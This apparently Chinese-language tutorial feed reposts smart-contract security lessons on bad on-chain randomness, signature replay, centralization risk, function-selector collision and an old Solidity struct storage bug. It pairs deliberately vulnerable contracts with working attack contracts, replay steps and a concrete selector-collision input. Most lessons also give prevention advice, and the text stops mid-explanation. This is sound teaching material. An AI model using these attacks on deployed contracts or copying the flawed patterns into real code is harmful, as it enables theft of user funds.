class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract BadRandomness is ERC721 &#123;</span><br><span class="line">    uint256 totalSupply;</span><br><span class="line"></span><br><span class="line">    // 构造函数，初始化NFT合集的名称、代号</span><br><span class="line">    constructor() ERC721(&quot;&quot;, &quot;&quot;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint</span><br><span class="line">    function luckyMint(uint256 luckyNumber) external &#123;</span><br><span class="line">        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number</span><br><span class="line">        require(randomNumber == luckyNumber, &quot;Better luck next time!&quot;);</span><br><span class="line"></span><br><span class="line">        _mint(msg.sender, totalSupply); // mint</span><br><span class="line">        totalSupply++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它有一个主要的铸造函数 <code>luckyMint()</code>，用户调用时输入一个 <code>0-99</code> 的数字，如果和链上生成的伪随机数 <code>randomNumber</code> 相等，即可铸造幸运 NFT。伪随机数使用 <code>blockhash</code> 和 <code>block.timestamp</code> 声称。这个漏洞在于用户可以完美预测生成的随机数并铸造NFT。</p><p>下面我们写个攻击合约 <code>Attack.sol</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    function attackMint(BadRandomness nftAddr) external &#123;</span><br><span class="line">        // 提前计算随机数</span><br><span class="line">        uint256 luckyNumber = uint256(</span><br><span class="line">            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))</span><br><span class="line">        ) % 100;</span><br><span class="line">        // 利用 luckyNumber 攻击</span><br><span class="line">        nftAddr.luckyMint(luckyNumber);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击函数 <code>attackMint()</code>中的参数为 <code>BadRandomness</code>合约地址。在其中，我们计算了随机数 <code>luckyNumber</code>，然后将它作为参数输入到 <code>luckyMint()</code> 函数完成攻击。由于<code>attackMint()</code>和<code>luckyMint()</code>将在同一个区块中调用，<code>blockhash</code>和<code>block.timestamp</code>是相同的，利用他们生成的随机数也相同。</p><h2 id="Remix-复现"><a href="#Remix-复现" class="headerlink" title="Remix 复现"></a><code>Remix</code> 复现</h2><p>由于 Remix 自带的 Remix VM不支持 <code>blockhash</code>函数，因此你需要将合约部署到以太坊测试链上进行复现。</p><ol><li>部署 <code>BadRandomness</code> 合约。</li><li>部署 <code>Attack</code> 合约。</li><li>将 <code>BadRandomness</code> 合约地址作为参数传入到 <code>Attack</code> 合约的 <code>attackMint()</code> 函数并调用，完成攻击。</li><li>调用 <code>BadRandomness</code> 合约的 <code>balanceOf</code> 查看<code>Attack</code> 合约NFT余额，确认攻击成功。</li></ol><h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>我们通常使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。这类随机数从链下生成，然后上传到链上，从而保证随机数不可预测。更多介绍可以阅读 <a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random">WTF Solidity极简教程 第39讲：伪随机数</a>。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一讲我们介绍了坏随机数漏洞，并介绍了一个简单的预防方法：使用预言机项目提供的链下随机数。NFT 和 GameFi 项目方应避免使用链上伪随机数进行抽奖，以防被黑客利用。</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>29.签名重放</title>
      <link href="/2023/06/23/00.security/29.%E7%AD%BE%E5%90%8D%E9%87%8D%E6%94%BE/"/>
      <url>/2023/06/23/00.security/29.%E7%AD%BE%E5%90%8D%E9%87%8D%E6%94%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="签名重放"><a href="#签名重放" class="headerlink" title="签名重放"></a>签名重放</h1><p><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/S06_SignatureReplay/readme.md">转载</a></p><p>这一讲，我们将介绍智能合约的签名重放（Signature Replay）攻击和预防方法，它曾间接导致了著名做市商 Wintermute 被盗2000万枚 $OP。</p><h2 id="签名重放-1"><a href="#签名重放-1" class="headerlink" title="签名重放"></a>签名重放</h2><p>上学的时候，老师经常会让家长签字，有时候家长很忙，我就会很“贴心”照着以前的签字抄一遍。某种意义上来说，这就是签名重放。</p><p>在区块链中，数字签名可以用于识别数据签名者和验证数据完整性。发送交易时，用户使用私钥签名交易，使得其他人可以验证交易是由相应账户发出的。智能合约也能利用 <code>ECDSA</code> 算法验证用户将在链下创建的签名，然后执行铸造或转账等逻辑。更多关于数字签名的介绍请见<a href="https://github.com/AmazingAng/WTFSolidity/blob/main/37_Signature/readme.md">WTF Solidity第37讲：数字签名</a>。</p><p>数字签名一般有两种常见的重放攻击：</p><ol><li>普通重放：将本该使用一次的签名多次使用。NBA官方发布的《The Association》系列 NFT 因为这类攻击被免费铸造了上万枚。</li><li>跨链重放：将本该在一条链上使用的签名，在另一条链上重复使用。做市商 Wintermute 因为跨链重放攻击被盗2000万枚 $OP。</li></ol><p><img src="/2023/06/23/00.security/29.%E7%AD%BE%E5%90%8D%E9%87%8D%E6%94%BE/S06-1.png" alt="img"></p><h2 id="漏洞合约例子"><a href="#漏洞合约例子" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>下面的<code>SigReplay</code>合约是一个<code>ERC20</code>代币合约，它的铸造函数有签名重放漏洞。它使用链下签名让白名单地址 <code>to</code> 铸造相应数量 <code>amount</code> 的代币。合约中保存了 <code>signer</code> 地址，来验证签名是否有效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 权限管理错误例子</span><br><span class="line">contract SigReplay is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">    address public signer;</span><br><span class="line"></span><br><span class="line">    // 构造函数：初始化代币名称和代号</span><br><span class="line">    constructor() ERC20(&quot;SigReplay&quot;, &quot;Replay&quot;) &#123;</span><br><span class="line">        signer = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 有签名重放漏洞的铸造函数</span><br><span class="line">     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><br><span class="line">     * amount: 1000</span><br><span class="line">     * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b</span><br><span class="line">     */</span><br><span class="line">    function badMint(address to, uint amount, bytes memory signature) public &#123;</span><br><span class="line">        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));</span><br><span class="line">        require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash</span><br><span class="line">     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><br><span class="line">     * amount: 1000</span><br><span class="line">     * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be</span><br><span class="line">     */</span><br><span class="line">    function getMessageHash(address to, uint256 amount) public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(abi.encodePacked(to, amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 获得以太坊签名消息</span><br><span class="line">     * `hash`：消息哈希 </span><br><span class="line">     * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span><br><span class="line">     * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191`</span><br><span class="line">     * 添加&quot;\x19Ethereum Signed Message:\n32&quot;字段，防止签名的是可执行交易。</span><br><span class="line">     */</span><br><span class="line">    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) &#123;</span><br><span class="line">        // 32 is the length in bytes of hash,</span><br><span class="line">        // enforced by the type signature above</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, hash));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ECDSA验证</span><br><span class="line">    function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool)&#123;</span><br><span class="line">        return ECDSA.recover(_msgHash, _signature) == signer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong> 铸造函数 <code>badMint()</code> 没有对 <code>signature</code> 查重，导致同样的签名可以多次使用，无限铸造代币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function badMint(address to, uint amount, bytes memory signature) public &#123;</span><br><span class="line">    bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount)));</span><br><span class="line">    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);</span><br><span class="line">    _mint(to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Remix-复现"><a href="#Remix-复现" class="headerlink" title="Remix 复现"></a><code>Remix</code> 复现</h2><p>1.部署 <code>SigReplay</code> 合约，签名者地址 <code>signer</code> 被初始化为部署钱包地址。</p><p><img src="/2023/06/23/00.security/29.%E7%AD%BE%E5%90%8D%E9%87%8D%E6%94%BE/S06-2.png" alt="img"></p><p>2.利用<code>getMessageHash</code>函数获取消息。</p><p><img src="/2023/06/23/00.security/29.%E7%AD%BE%E5%90%8D%E9%87%8D%E6%94%BE/S06-3.png" alt="img"></p><p>3.点击 <code>Remix</code> 部署面板的签名按钮，使用私钥给消息签名。</p><p><img src="/2023/06/23/00.security/29.%E7%AD%BE%E5%90%8D%E9%87%8D%E6%94%BE/S06-4.png" alt="img"></p><ol><li>反复调用 <code>badMint</code> 进行签名重放攻击，铸造大量代币。</li></ol><p><img src="/2023/06/23/00.security/29.%E7%AD%BE%E5%90%8D%E9%87%8D%E6%94%BE/S06-5.png" alt="img"></p><h2 id="预防办法"><a href="#预防办法" class="headerlink" title="预防办法"></a>预防办法</h2><p>签名重放攻击主要有两种预防办法：</p><p>1.将使用过的签名记录下来，比如记录下已经铸造代币的地址 <code>mintedAddress</code>，防止签名反复使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mapping(address =&gt; bool) public mintedAddress;   // 记录已经mint的地址</span><br><span class="line"></span><br><span class="line">function goodMint(address to, uint amount, bytes memory signature) public &#123;</span><br><span class="line">    bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));</span><br><span class="line">    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);</span><br><span class="line">    // 检查该地址是否mint过</span><br><span class="line">    require(!mintedAddress[to], &quot;Already minted&quot;);</span><br><span class="line">    // 记录mint过的地址</span><br><span class="line">    mintedAddress[to] = true;</span><br><span class="line">    _mint(to, amount);</span><br><span class="line">&#125;</span><br><span class="line">```solidity</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.将 <code>nonce</code> （数值随每次交易递增）和 <code>chainid</code> （链ID）包含在签名消息中，这样可以防止普通重放和跨链重放攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint nonce;</span><br><span class="line"></span><br><span class="line">function nonceMint(address to, uint amount, bytes memory signature) public &#123;</span><br><span class="line">    bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid)));</span><br><span class="line">    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);</span><br><span class="line">    _mint(to, amount);</span><br><span class="line">    nonce++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了智能合约中的签名重放漏洞，并介绍了两个预防方法：</p><ol><li>将使用过的签名记录下来，防止二次使用。</li><li>将 <code>nonce</code> 和 <code>chainid</code> 包含到签名消息中。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>28.伪去中心化</title>
      <link href="/2023/06/23/00.security/28.%E4%BC%AA%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96/"/>
      <url>/2023/06/23/00.security/28.%E4%BC%AA%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="伪去中心化"><a href="#伪去中心化" class="headerlink" title="伪去中心化"></a>伪去中心化</h1><p><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/S03_Centralization/readme.md">转载</a></p><p>这一讲，我们将介绍智能合约中的中心化和伪去中心化所带来的风险。<code>Ronin</code>桥和<code>Harmony</code>桥因该漏洞被黑客攻击，分别被盗取了 6.24 亿美元和 1 亿美元。</p><h2 id="中心化风险"><a href="#中心化风险" class="headerlink" title="中心化风险"></a>中心化风险</h2><p>我们经常以Web3的去中心化为骄傲，认为在Web3.0世界里，所有权和控制权都是去中心化。但实际上，中心化是Web3项目最常见的风险之一。知名区块链审计公司Certik在<a href="https://f.hubspotusercontent40.net/hubfs/4972390/Marketing/defi security report 2021-v6.pdf">2021年DeFi安全报告</a>中指出：</p><blockquote><p>中心化风险是 DeFi 中最常见的漏洞，2021年中有 44 次 DeFi 黑客攻击与它相关，造成用户资金损失超过 13 亿美元。这强调了权力下放的重要性，许多项目仍需努力实现这一目标。</p></blockquote><p>中心化风险指智能合约的所有权是中心化的，例如合约的<code>owner</code>由一个地址控制，它可以随意修改合约参数，甚至提取用户资金。中心化的项目存在单点风险，可以被恶意开发者（内鬼）或黑客利用，只需要获取具有控制权限地址的私钥之后，就可以通过<code>rug-pull</code>，无限铸币，或其他类型方法盗取资金。</p><p>链游项目<code>Vulcan Forged</code>在2021年12月因私钥泄露被盗 1.4 亿美元，DeFi项目<code>EasyFi</code>在2021年4月因私钥泄露被盗 5900 万美元，DeFi项目<code>bZx</code>在钓鱼攻击中私钥泄露被盗 5500 万美元。</p><h2 id="伪去中心化风险"><a href="#伪去中心化风险" class="headerlink" title="伪去中心化风险"></a>伪去中心化风险</h2><p>伪去中心化的项目通常对外鼓吹自己是去中心化的，但实际上和中心化项目一样存在单点风险。比如使用多签钱包来管理智能合约，但几个多签人是一致行动人，背后由一个人控制。这类项目由于包装的很去中心化，容易得到投资者信任，所以当黑客事件发生时，被盗金额也往往更大。</p><p>近两年爆火的链游项目 Axie 的 Ronin 链跨链桥项目在2022年3月被盗 6.24 亿美元，是历史上被盗金额最大的事件。Ronin 跨链桥由 9 个验证者维护，必须有 5 个人达成共识才能批准存款和提款交易。这看起来像多签一样，非常去中心化。但实际上其中 4 个验证者由 Axie 的开发公司 Sky Mavis 控制，而另 1 个由 Axie DAO 控制的验证者也批准了 Sky Mavis 验证节点代表他们签署交易。因此，在攻击者获取了 Sky Mavis 的私钥后（具体方法未披露），就可以控制 5 个验证节点，授权盗走了 173,600 ETH 和 2550 万USDC。</p><p><code>Harmony</code>公链的跨链桥在2022年6月被盗 1 亿美元。<code>Harmony</code>桥由5 个多签人控制，很离谱的是只需其中 2 个人签名就可以批准一笔交易。在黑客设法盗取两个多签人的私钥后，将用户质押的资产盗空。</p><p><img src="/2023/06/23/00.security/28.%E4%BC%AA%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96/S03-1.png" alt="img"></p><h2 id="漏洞合约例子"><a href="#漏洞合约例子" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>有中心化风险的合约多种多样，这里只举一个最常见的例子：<code>owner</code>地址可以任意铸造代币的<code>ERC20</code>合约。当项目内鬼或黑客取得<code>owner</code>的私钥后，可以无限铸币，造成投资人大量损失。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Centralization is ERC20, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;Centralization&quot;, &quot;Cent&quot;) &#123;</span><br><span class="line">        address exposedAccount = 0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2;</span><br><span class="line">        transferOwnership(exposedAccount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) external onlyOwner&#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何减少中心化-伪去中心化风险？"><a href="#如何减少中心化-伪去中心化风险？" class="headerlink" title="如何减少中心化/伪去中心化风险？"></a>如何减少中心化/伪去中心化风险？</h2><ol><li>使用多签钱包管理国库和控制合约参数。为了兼顾效率和去中心化，可以选择 4/7 或 6/9 多签。如果你不了解多签钱包，可以阅读<a href="https://github.com/AmazingAng/WTFSolidity/blob/main/50_MultisigWallet/readme.md">WTF Solidity第50讲：多签钱包</a>。</li><li>多签的持有人要多样化，分散在创始团队、投资人、社区领袖之间，并且不要相互授权签名。</li><li>使用时间锁控制合约，在黑客或项目内鬼修改合约参数/盗取资产时，项目方和社区有一些时间来应对，将损失最小化。如果你不了解时间锁合约，可以阅读<a href="https://github.com/AmazingAng/WTFSolidity/blob/main/45_TokenLocker/readme.md">WTF Solidity第45讲：时间锁</a>。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>中心化/伪去中心化是区块链项目最大的风险，近两年造成用户资金损失超过 20 亿美元。中心化风险通过分析合约代码就可以发现，而伪去中心化风险藏的更深，需要对项目进行细致的尽职调查才能发现。</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>27.选择器碰撞</title>
      <link href="/2023/06/23/00.security/27.%E9%80%89%E6%8B%A9%E5%99%A8%E7%A2%B0%E6%92%9E/"/>
      <url>/2023/06/23/00.security/27.%E9%80%89%E6%8B%A9%E5%99%A8%E7%A2%B0%E6%92%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="选择器碰撞"><a href="#选择器碰撞" class="headerlink" title="选择器碰撞"></a>选择器碰撞</h1><h2 id="digest"><a href="#digest" class="headerlink" title="digest"></a>digest</h2><p>以太坊智能合约中，函数选择器是函数签名 <code>&quot;&lt;function name&gt;(&lt;function input types&gt;)&quot;</code> 的哈希值的前<code>4</code>个字节（<code>8</code>位十六进制）。当用户调用合约的函数时，<code>calldata</code>的前<code>4</code>字节就是目标函数的选择器，决定了调用哪个函数。</p><p>由于函数选择器只有<code>4</code>字节，非常短，很容易被碰撞出来：即我们很容易找到两个不同的函数，但是他们有着相同的函数选择器。比如<code>transferFrom(address,address,uint256)</code>和<code>gasprice_bit_ether(int128)</code>有着相同的选择器：<code>0x23b872dd</code>。当然你也可以写个脚本暴力破解。</p><p><img src="https://moe.photo/images/2023/01/16/image-20230116193618280.png" alt></p><p>大家可以用这两个网站来查同一个选择器对应的不同函数：</p><ol><li><a href="https://www.4byte.directory/">https://www.4byte.directory/</a></li><li><a href="https://sig.eth.samczsun.com/">https://sig.eth.samczsun.com/</a></li></ol><p>你也可以使用下面的<code>Power Clash</code>工具进行暴力破解：</p><ol><li>PowerClash: <a href="https://github.com/AmazingAng/power-clash">https://github.com/AmazingAng/power-clash</a></li></ol><p>相比之下，钱包的公钥有<code>256</code>字节，被碰撞出来的概率几乎为<code>0</code>，非常安全。</p><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>下面我们来看一下有漏洞的合约例子。<code>SelectorClash</code>合约有<code>1</code>个状态变量 <code>solved</code>，初始化为<code>false</code>，攻击者需要将它改为<code>true</code>。合约主要有<code>2</code>个函数，函数名沿用自 Poly Network 漏洞合约。</p><ol><li><code>putCurEpochConPubKeyBytes()</code> ：攻击者调用这个函数后，就可以将<code>solved</code>改为<code>true</code>，完成攻击。但是这个函数检查<code>msg.sender == address(this)</code>，因此调用者必须为合约本身，我们需要看下其他函数。</li><li><code>executeCrossChainTx()</code> ：通过它可以调用合约内的函数，但是函数参数的类型和目标函数不太一样：目标函数的参数为<code>(bytes)</code>，而这里调用的函数参数为<code>(bytes,bytes,uint64)</code>。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract SelectorClash &#123;</span><br><span class="line">    bool public solved; // 攻击是否成功</span><br><span class="line"></span><br><span class="line">    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。</span><br><span class="line">    function putCurEpochConPubKeyBytes(bytes memory _bytes) public &#123;</span><br><span class="line">        require(msg.sender == address(this), &quot;Not Owner&quot;);</span><br><span class="line">        solved = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。</span><br><span class="line">    function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success)&#123;</span><br><span class="line">        (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_bytes, _bytes1, _num)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>我们的目标是利用<code>executeCrossChainTx(bytes,bytes,bytes)</code>函数调用合约中的<code>putCurEpochConPubKeyBytes(bytes)</code>，目标函数的选择器为：<code>0x41973cd9</code>。观察到<code>executeCrossChainTx(bytes,bytes,bytes)</code>中是利用<code>_method</code>参数和<code>&quot;(bytes,bytes,uint64)&quot;</code>作为函数签名计算的选择器。因此，我们只需要选择恰当的<code>_method</code>，让这里算出的选择器等于<code>0x41973cd9</code>，通过选择器碰撞调用目标函数。</p><p>Poly Network黑客事件中，黑客碰撞出的<code>_method</code>为 <code>f1121318093</code>，即<code>f1121318093(bytes,bytes,uint64)</code>的哈希前<code>4</code>位也是<code>0x41973cd9</code>，可以成功的调用函数。接下来我们要做的就是将<code>f1121318093</code>转换为<code>bytes</code>类型：<code>0x6631313231333138303933</code>，然后作为参数输入到<code>executeCrossChainTx(bytes,bytes,bytes)</code>中。<code>executeCrossChainTx(bytes,bytes,bytes)</code>函数另<code>3</code>个参数不重要，都填 <code>0x</code> 就可以。</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><ol><li>部署<code>SelectorClash</code>合约。</li><li>调用<code>executeCrossChainTx()</code>，参数填<code>0x6631313231333138303933</code>，<code>0x</code>，<code>0x</code>，<code>0</code>，发起攻击。</li><li>查看<code>solved</code>变量的值，被修改为<code>ture</code>，攻击成功。</li></ol><p><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/S02_SelectorClash/readme.md">引用</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>26.struct低版本漏洞</title>
      <link href="/2023/06/23/00.security/26.struct%E4%BD%8E%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/06/23/00.security/26.struct%E4%BD%8E%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="struct低版本漏洞"><a href="#struct低版本漏洞" class="headerlink" title="struct低版本漏洞"></a>struct低版本漏洞</h1><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.17;</span><br><span class="line">// A locked name registrar</span><br><span class="line">contract NameRegistrar &#123;</span><br><span class="line"></span><br><span class="line">    bool public unlocked = false;  // registrar locked, no name updates</span><br><span class="line"></span><br><span class="line">    struct NameRecord &#123; // map hashes to addresses</span><br><span class="line">        bytes32 name;</span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // records who registered names</span><br><span class="line">    mapping(address =&gt; NameRecord) public registeredNameRecord;</span><br><span class="line">    // resolves hashes to addresses</span><br><span class="line">    mapping(bytes32 =&gt; address) public resolve;</span><br><span class="line"></span><br><span class="line">    function register(bytes32 _name, address _mappedAddress) public &#123;</span><br><span class="line">        // set up the new NameRecord</span><br><span class="line">        NameRecord newRecord ;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress;</span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord;</span><br><span class="line"></span><br><span class="line">        require(unlocked); // only allow registrations if contract is unlocked</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><p>This simple name registrar has only one function. When the contract is <code>unlocked</code>, it allows anyone to register a name (as a <code>bytes32</code> hash) and map that name to an address. The registrar is initially locked, and the <code>require</code> on line 25 prevents <code>register</code> from adding name records. It seems that the contract is unusable, as there is no way to unlock the registry! There is, however, a vulnerability that allows name registration regardless of the <code>unlocked</code> variable.</p><p>To discuss this vulnerability, first we need to understand how storage works in Solidity. As a high-level overview (without any proper technical detail—we suggest reading the Solidity docs for a proper review), state variables are stored sequentially in <em>slots</em> as they appear in the contract (they can be grouped together but aren’t in this example, so we won’t worry about that). Thus, <code>unlocked</code> exists 